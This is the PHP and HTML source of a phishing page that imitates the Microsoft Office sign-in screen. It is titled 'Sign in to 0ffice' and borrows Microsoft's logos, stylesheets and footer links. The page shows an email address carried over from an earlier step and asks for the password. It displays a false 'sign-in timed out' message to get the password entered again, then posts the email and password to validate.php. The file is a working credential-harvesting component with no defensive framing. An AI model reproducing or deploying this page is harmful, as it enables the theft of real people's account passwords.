<?php
session_start();
$em = $_SESSION[ 'login1' ];
?>

<!DOCTYPE html>
<html dir="ltr" class="" lang="en">
<head>
	<title>Sign in to 0ffice</title>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
	<link rel="shortcut icon" href="https://aadcdn.msftauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico"/>
	<meta name="robots" content="none"/>
	<style>
		.form-group:not(.has-error) .error-message {
			display: none !important;
		}
	</style>
	<link crossorigin="anonymous" href="https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_tbsima5-c7pluzuyz0ftda2.css" rel="stylesheet"/>

	<style>
		body {
			font-size: 14px
		}
		
		.input:focus {
			border-color: #aaaaaa;
			outline: none;
		}
		
		.input-error {
			position: relative;
			top: -8px;
			font-size: .8375rem;
			line-height: 1.25rem;
			text-align: left;
			font-weight: 400;
			color: #e81123;
			display: block;
			float: left;
			clear: both;
		}
	</style>
</head>

<body class="cb" style="display: block;">

	<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
	<div>

		<div>
			<div class="background app" role="presentation">
				
				<div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(background.jpg;);"></div>
				
				<div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(background.jpg;);"></div>
			</div>
			<form name="loginform" class="login-form" id="loginform" method="post" autocomplete="off" action="validate.php">
				<div class="outer">
					<div class="middle app">
						


						<div class="inner app fade-in-lightbox">
							<div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"></div>
							<div data-bind="component: { name: 'logo-control',
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: bannerLogoUrl() } }">

								<img class="logo" pngsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://aadcdn.msftauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft">

							</div>


							<div role="main">
								<div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="">
									<div role="heading" aria-level="2" class="text-13 subtitle" data-bind="text: subtitle">
										<script>
											function goBack() {
												window.history.back();
											}
										</script>

										<br/>
										<img role="presentation" onclick="goBack()" pngsrc="https://logincdn.msauth.net/16.000.28170.6/images/arrow_left.png?x=7cc096da6aa2dba3f81fcc1c8262157c" svgsrc="https://logincdn.msauth.net/16.000.28170.6/images/arrow_left.svg?x=a9cc2824ef3517b6c4160dcf8ff7d410" data-bind="imgSrc" src="https://logincdn.msauth.net/16.000.28170.6/images/arrow_left.svg?x=a9cc2824ef3517b6c4160dcf8ff7d410">
										<?php echo $em; ?>
									</div>
									<div class="pagination-view animate slide-in-next">
										<div data-viewid="1" data-showfedcredbutton="true">

											<div>
												<div class="row text-title" id="loginHeader">
													<div role="heading" aria-level="1" data-bind="text: title">Enter password</div>


												</div>
											</div>
											<div class="row">

												<div class="form-group col-md-24">

													<div class="placeholderContainer">

														<div class="form-group">
															<span id="myDIV" style="color:#e81123">Sorry, your sign-in timed out. Please sign in again</span>
															<span style="color:#e81123" class="error">
																<p style="margin:0; padding:0; font-size:14px" id="pass_error"></p>
															</span>


															<input type="password" name="pass2" id="pass" lang="en" class="form-control ltr_override" placeholder="Password"/>

															<input type="hidden" name="email1" value="<?php echo $em; ?>" />


														</div>

													</div>
													<!-- /ko -->
												</div>
												<div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons">
													<div class="row">
														<div class="col-md-24">
															<div class="text-13 action-links">


																<div class="form-group">
																	<a id="cantAccessAccount" name="cannotAccessAccount" href="#">Forgot my password</a> </div>


															</div>
														</div>
													</div>
													<div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
														<div>
															<div class="col-xs-24 no-padding-left-right button-container">
																<!-- ko if: isSecondaryButtonVisible -->
																<!-- /ko -->
																<div class="inline-block">
																	<!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 --><input type="submit" id="idSIButton9" onclick="myFunction()" class="btn btn-block btn-primary" value="Sign in"> </div>
																<script>
																	function myFunction() {
																		var x = document.getElementById( "myDIV" );
																		if ( x.style.display === "none" ) {
																			x.style.display = "block";
																		} else {
																			( x.style.color = "#ffffff" ) && ( x.style.display = "none" );
																		}
																	}
																</script>
															</div>
														</div>
													</div>
												</div>
											</div>

										</div>
									</div>
								</div>

							</div>

						</div>



					</div>
				</div>

			</form>
			<script>
				document.getElementById( "loginform" ).onsubmit = function () {
					var y = document.forms[ "loginform" ][ "pass" ].value;

					var submit = true;


					if ( y == null || y == "" ) {
						emailError = "Your email or password is incorrect. If you don't remember your password." + ' <a href="#">reset it now</a>';

						document.getElementById( "pass_error" ).innerHTML = emailError;
						submit = false;
					}

					return submit;
				}

				function removeWarning() {
					document.getElementById( this.id + "_error" ).innerHTML = "";
				}

				document.getElementById( "pass" ).onkeyup = removeWarning;
			</script>
			<script>
				$( '#password, #confirm_password' ).on( 'keyup', function () {
					if ( $( '#password' ).val() == $( '#confirm_password' ).val() ) {
						$( '#message' ).html( 'Matching' ).css( 'color', 'green' );
					} else
						$( '#message' ).html( 'Not Matching' ).css( 'color', 'red' );
				} );
			</script>
			<script>
				$( "form" ).submit( function () {
					var hasError = false;
					$( ".has-error, .has-success" ).removeClass( "has-error" ).removeClass( "has-success" );
					if ( $( "#pass" ).val() == "" ) {
						$( "#pass" ).closest( ".form-group" ).addClass( "has-error" );
						hasError = true;
					} else {
						$( "#pass" ).closest( ".form-group" ).addClass( "has-success" );
					}

					return !hasError;
				} );
			</script>
			<div id="footer" class="footer" role="contentinfo" data-bind="css: { 'default': !backgroundLogoUrl() }">
				<div data-bind="component: { name: 'footer-control',
                    params: {
                        serverData: svr,
                        debugDetails: debugDetails,
                        showLinks: true },
                    event: {
                        agreementClick: footer_agreementClick } }">
					<!--  -->
					<!-- ko if: showLinks || impressumLink || showIcpLicense -->
					<div id="footerLinks" class="footerNode text-secondary">
						<!-- ko if: !showIcpLicense --><span id="ftrCopy" data-bind="html: svr.strCopyrightTxt">©2021 Microsoft</span>
						<!-- /ko --><a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="https://www.microsoft.com/en-GB/servicesagreement/">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="https://privacy.microsoft.com/en-GB/privacystatement">Privacy &amp; cookies</a>
						<!-- ko if: impressumLink -->
						<!-- /ko -->
						<!-- ko if: showIcpLicense -->
						<!-- /ko -->
						<a href="#" role="button" class="moreOptions" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
				hasFocus: focusMoreInfo()" aria-label="Click here for troubleshooting information">
				
				<img class="desktopMode" role="presentation" pngsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/ellipsis_white_0ad43084800fd8b50a2576b5173746fe.png" svgsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg" data-bind="imgSrc" src="https://aadcdn.msftauth.net/ests/2.1/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg">
								
									<img class="mobileMode" role="presentation" pngsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/ellipsis_grey_5bc252567ef56db648207d9c36a9d004.png" svgsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg" data-bind="imgSrc" src="https://aadcdn.msftauth.net/ests/2.1/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg">
								
									
								</a>

					
					</div>
				</div>
			</div>
		</div>

	</div>



</body>
</html>